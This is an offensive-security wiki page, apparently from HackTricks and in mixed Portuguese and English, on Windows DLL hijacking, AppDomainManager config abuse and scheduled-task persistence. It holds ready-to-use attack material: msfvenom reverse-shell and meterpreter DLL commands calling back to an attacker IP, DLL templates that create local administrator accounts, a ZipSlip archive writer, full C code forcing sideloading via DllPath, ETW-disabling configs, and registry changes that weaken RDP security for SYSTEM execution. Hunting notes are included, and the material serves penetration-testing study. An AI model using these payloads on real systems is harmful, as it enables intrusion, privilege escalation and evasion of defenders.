# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking envolve manipular um aplicativo confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para code execution, achieving persistence, e, com menos frequência, privilege escalation. Apesar do foco em escalation aqui, o método de hijacking permanece consistente entre os objetivos.

### Common Techniques

Vários métodos são empregados para DLL hijacking, cada um com sua efetividade dependendo da estratégia de carregamento de DLL do aplicativo:

1. **DLL Replacement**: Trocar uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca antes da legítima, explorando o padrão de busca do aplicativo.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para um aplicativo carregar, acreditando que ela é uma DLL necessária e inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma contraparte maliciosa no diretório WinSxS, um método frequentemente associado a DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com o aplicativo copiado, lembrando técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading não é a única forma de fazer um processo confiável **.NET Framework** carregar código do attacker. Se o executável alvo for um aplicativo **managed**, o CLR também consulta um **application configuration file** nomeado após o executável (por exemplo `Setup.exe.config`). Esse arquivo pode definir um **AppDomainManager** personalizado. Se o config apontar para um assembly controlado pelo attacker colocado ao lado do EXE, o CLR o carrega **before the application's normal code path** e executa dentro do processo confiável.

Segundo o schema de configuração do .NET Framework da Microsoft, tanto `<appDomainManagerAssembly>` quanto `<appDomainManagerType>` devem estar presentes para que o manager personalizado seja usado.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Manager mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas práticas:
- Isso é tradecraft específico de **.NET Framework**. Depende do parsing da configuração do CLR, não da ordem de busca de DLL do Win32.
- O host precisa realmente ser um **managed EXE**. Triagem rápida: `sigcheck -m target.exe`, `corflags target.exe`, ou verifique o **CLR Runtime Header** nos metadados PE.
- O nome do arquivo de configuração deve corresponder exatamente ao nome do executável (`<binary>.config`) e normalmente fica **ao lado do EXE**.
- Isso é útil com **signed Microsoft/vendor binaries** porque o EXE confiável permanece intocado enquanto a assembly managed maliciosa executa in-process.
- Se você já tem um diretório de instalador/update gravável, AppDomainManager hijacking pode ser usado como a **first stage**, seguido por classic DLL sideloading ou reflective loading para as etapas posteriores.

### AppDomainManager como downloader + bootstrap de scheduled-task

Um padrão prático de intrusion é combinar o managed EXE confiável com um `*.config` malicioso e uma DLL AppDomainManager maliciosa que atua apenas como um **pequeno bootstrapper**:

1. O usuário executa um instalador ou updater .NET assinado a partir de um local plausível como `%USERPROFILE%\Downloads`.
2. O config adjacente faz o CLR carregar a assembly do attacker **antes** de a lógica legítima do app começar.
3. O manager malicioso executa uma **path gate** (por exemplo, continuar apenas se o host EXE estiver sendo executado a partir de `Downloads`, e permitir que a second stage rode apenas de `%LOCALAPPDATA%`).
4. Se a verificação passar, ele baixa o payload real para um caminho gravável pelo usuário como `%LOCALAPPDATA%\PerfWatson2.exe` e instala persistence com uma scheduled task.

Por que essa variante importa:
- O signed host EXE permanece inalterado, então triagem que faz hash apenas do binário principal pode não perceber a compromise.
- **Path-based anti-analysis** simples é comum: mover o trio ZIP/EXE/DLL para Desktop, Temp ou um caminho de sandbox pode quebrar a cadeia de propósito.
- A DLL AppDomainManager da first stage pode ficar pequena e discreta enquanto o implant real é obtido depois.

Exemplo mínimo de persistence frequentemente visto com esse padrão:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notas:
- ` /rl highest` significa **highest available** para esse usuário/sessão; não é uma escalada para SYSTEM garantida por si só.
- Essa técnica costuma ser melhor categorizada como **execution/persistence via .NET config abuse** do que como classic missing-DLL search-order hijacking, embora operadores frequentemente combinem as duas.

Pontos de detecção:
- Executáveis .NET assinados iniciados a partir de caminhos de **ZIP extraction**, `Downloads`, `%TEMP%` ou outras pastas graváveis pelo usuário, com um `<exe>.config` **colocated**.
- Novas scheduled tasks cuja action aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads` e cujos nomes imitam browser/vendor updaters.
- Processos managed bootstrap de curta duração que imediatamente baixam outro EXE e depois executam `schtasks.exe`.
- Samples que encerram cedo a menos que o caminho do executável corresponda a um diretório esperado do perfil do usuário.

### Hijacking an existing scheduled task to relaunch the sideload chain

Para persistence, não procure apenas por **creating a new task**. Alguns intrusion sets esperam até que um instalador legítimo crie uma **normal updater task** e então **rewrite the task action** para que o nome, o author e o trigger existentes continuem familiares para os defenders.

Fluxo reutilizável:
1. Instale/execute o software legítimo e identifique a task que ele normalmente cria.
2. Exporte o XML da task e anote os valores atuais de `<Exec><Command>` / `<Arguments>`.
3. Substitua apenas a action para que a task inicie seu **trusted host EXE** a partir de um diretório staging gravável pelo usuário, que então faz side-load ou AppDomain-load do payload real.
4. Re-registre o mesmo nome de task em vez de criar um novo artifact de persistence óbvio.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por que é mais furtivo:
- O nome da task ainda pode parecer legítimo (por exemplo, um vendor updater).
- O **Task Scheduler service** a inicia, então a validação de parent/ancestor muitas vezes vê a cadeia de scheduling esperada em vez de `explorer.exe`.
- Equipes de DFIR que só procuram por **novos task names** podem não notar uma task cuja registration já existia, mas cuja action agora aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou outro path controlado pelo atacante.

Pivôs rápidos de hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare o XML de `C:\Windows\System32\Tasks\*` e os metadados de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` contra um baseline.
- Gere alerta quando uma **vendor-looking updater task** executa a partir de **user-writable directories** ou inicia um .NET EXE com um arquivo `*.config` no mesmo diretório.

> [!TIP]
> Para uma cadeia passo a passo que combina HTML staging, configs AES-CTR e implants .NET sobre DLL sideloading, revise o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

A forma mais comum de encontrar missing Dlls dentro de um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **2 seguintes filtros**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

e mostrar apenas a **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Se você estiver procurando por **missing dlls em geral**, deixe isso rodando por alguns **segundos**.\
Se você estiver procurando por uma **missing dll dentro de um executável específico**, você deve configurar **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo e parar a captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilégios, a melhor chance que temos é conseguir **escrever uma dll que um processo privilegiado tentará carregar** em algum **local onde ela será procurada**. Portanto, poderemos **escrever** uma dll em uma **pasta** onde a **dll é procurada antes** da pasta onde a **dll original** está (caso estranho), ou poderemos **escrever em alguma pasta onde a dll será procurada** e a **dll original** não existe em nenhuma pasta.

### Dll Search Order

**Dentro da** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como as Dlls são carregadas especificamente.**

**Windows applications** procuram DLLs seguindo um conjunto de **caminhos de busca predefinidos**, obedecendo a uma sequência específica. O problema de DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que ela seja carregada antes da DLL autêntica. Uma solução para evitar isso é garantir que a aplicação use paths absolutos ao referenciar as DLLs de que precisa.

Você pode ver abaixo a **ordem de busca de DLLs em sistemas 32-bit**:

1. O diretório de onde a aplicação foi carregada.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o path desse diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16-bit. Não existe uma função que obtenha o path desse diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o path desse diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o path por aplicação especificado pela chave de registry **App Paths**. A chave **App Paths** não é usada ao calcular o path de busca da DLL.

Essa é a ordem de busca **padrão** com **SafeDllSearchMode** habilitado. Quando ela está desabilitada, o diretório atual sobe para a segunda posição. Para desabilitar esse recurso, crie o valor de registry **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Por fim, observe que **uma dll pode ser carregada indicando o path absoluto em vez de apenas o nome**. Nesse caso, essa dll **só será procurada nesse path** (se a dll tiver dependências, elas serão procuradas como se tivessem sido carregadas por nome).

Há outras formas de alterar a ordem de busca, mas não vou explicá-las aqui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use filtros do **ProcMon** (`Process Name` = target EXE, `Path` termina com `.dll`, `Result` = `NAME NOT FOUND`) para coletar nomes de DLL que o processo tenta acessar, mas não encontra.
2. Se o binário roda por **schedule/service**, soltar uma DLL com um desses nomes no **application directory** (entrada #1 da ordem de busca) fará com que ela seja carregada na próxima execução. Em um caso de scanner .NET, o processo procurava `hostfxr.dll` em `C:\samples\app\` antes de carregar a cópia real de `C:\Program Files\dotnet\fxr\...`.
3. Construa uma payload DLL (por exemplo, reverse shell) com qualquer export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se o seu primitive for um **ZipSlip-style arbitrary write**, crie um ZIP cujo entry escape do extraction dir para que a DLL caia na pasta da app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entregue o archive para a watched inbox/share; quando a scheduled task reiniciar o process, ele carrega a malicious DLL e executa seu code como o service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar de maneira determinística o DLL search path de um novo process é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o process com as native APIs do ntdll. Ao fornecer aqui um directory controlado pelo atacante, um target process que resolve uma imported DLL pelo name (sem absolute path e sem usar os safe loading flags) pode ser forçado a carregar uma malicious DLL desse directory.

Key idea
- Build os process parameters com RtlCreateProcessParametersEx e forneça um custom DllPath que aponte para sua controlled folder (por exemplo, o directory onde seu dropper/unpacker fica).
- Crie o process com RtlCreateUserProcess. Quando o target binary resolver uma DLL pelo name, o loader consultará esse DllPath fornecido durante a resolução, permitindo sideloading confiável mesmo quando a malicious DLL não estiver no mesmo local que o target EXE.

Notes/limitations
- Isso afeta o child process que está sendo criado; é diferente de SetDllDirectory, que afeta apenas o current process.
- O target deve importar ou LoadLibrary uma DLL pelo name (sem absolute path e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e hardcoded absolute paths não podem ser hijacked. Forwarded exports e SxS podem mudar a precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque um xmllite.dll malicioso (exportando as funções necessárias ou fazendo proxy para o real) no seu diretório DllPath.
- Inicie um binary assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve o import via o DllPath fornecido e faz sideload da sua DLL.

Esta técnica foi observada in-the-wild sendo usada para conduzir cadeias multi-stage de sideloading: um launcher inicial solta uma helper DLL, que então inicia um binary assinado pela Microsoft, hijackable, com um DllPath customizado para forçar o carregamento da DLL do attacker a partir de um diretório de staging.


### .NET AppDomainManager hijacking via `.exe.config`

Para alvos **.NET Framework**, o sideloading pode ser feito **antes de `Main()`** sem patching de memory abusando do arquivo adjacente **`.exe.config`** da aplicação. Em vez de depender apenas da ordem de busca de DLL do Win32, o attacker coloca um .NET EXE legítimo ao lado de um config malicioso e uma ou mais assemblies controladas pelo attacker.

Como a cadeia funciona:
1. O host EXE inicia e o **CLR lê `<exe>.config`**.
2. O config define **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`** para que o runtime instancie um `AppDomainManager` controlado pelo attacker.
3. O manager malicioso recebe execução **pré-`Main()`** dentro do processo trusted host.
4. O mesmo config pode forçar o CLR a resolver primeiro as local assemblies (por exemplo `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e pode enfraquecer a validação/telemetria do runtime sem inline patching.

Padrão estilo campaign (o nesting exato pode variar conforme a directive / versão do CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** mantém a resolução de assembly no diretório da aplicação, transformando a pasta em uma superfície previsível de sideloading.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** movem a execução para o código do atacante durante a inicialização do CLR, antes que a lógica legítima da aplicação seja executada.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** pode permitir que uma app full-trust carregue assemblies sem assinatura ou adulterados sem falha de validação strong-name.
- **`<publisherPolicy apply="no"/>`** evita redirecionamentos de publisher-policy para assemblies mais novos.
- **`<requiredRuntime ... safemode="true"/>`** torna a seleção do runtime mais determinística.
- **`<etwEnable enabled="false"/>`** é especialmente interessante porque o **CLR desativa sua própria visibilidade via ETW** a partir da configuração, em vez de o implant patchar `EtwEventWrite` na memória.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Note que em vários casos o Dll que você compila deve **exportar várias funções** que vão ser carregadas pelo processo da vítima; se essas funções não existirem, o **binário não conseguirá carregá-las** e o **exploit falhará**.

<details>
<summary>Modelo de C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

O Windows Narrator.exe ainda verifica, na inicialização, uma DLL de localization previsível e específica de idioma, que pode ser hijacked para execução arbitrária de código e persistence.

Fatos principais
- Caminho de probe (builds atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (builds antigas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se existir uma DLL gravável controlada pelo attacker no caminho do OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` é executado. Nenhum export é necessário.

Discovery com Procmon
- Filter: `Process Name is Narrator.exe` e `Operation is Load Image` ou `CreateFile`.
- Inicie o Narrator e observe a tentativa de load do caminho acima.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Um hijack ingênuo vai falar/destacar a UI. Para ficar silencioso, ao fazer attach enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e use `SuspendThread` nela; continue na sua própria thread. Veja o PoC para o código completo.

Trigger and persistence via Accessibility configuration
- Contexto de usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o acima, iniciar o Narrator carrega a DLL plantada. No secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL executa como SYSTEM no secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Permita a classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conecte por RDP ao host, na tela de logon pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL executa como SYSTEM no secure desktop.
- A execução para quando a sessão RDP é fechada—injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada do registro de uma Accessibility Tool (AT) nativa (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e então definir `configuration` para esse nome de AT. Isso faz proxy de execução arbitrária sob o framework de Accessibility.

Notes
- Escrever em `%windir%\System32` e alterar valores HKLM requer privilégios de admin.
- Toda a lógica do payload pode ficar em `DLL_PROCESS_ATTACH`; nenhum export é necessário.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` executa diariamente às 9:30 AM sob o contexto do usuário logado.
- **Directory Permissions**: Gravável por `CREATOR OWNER`, permitindo que usuários locais depositem arquivos arbitrários.
- **DLL Search Behavior**: Tenta carregar `hostfxr.dll` primeiro do seu diretório de trabalho e registra "NAME NOT FOUND" se estiver ausente, indicando precedência de busca no diretório local.

### Exploit Implementation

Um atacante pode colocar um stub malicioso de `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código sob o contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Como um usuário padrão, solte `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a task agendada executar às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver logado quando a task executar, a DLL maliciosa roda na sessão do administrador com integridade média.
4. Encadeie técnicas padrão de UAC bypass para elevar de integridade média para privilégios SYSTEM.

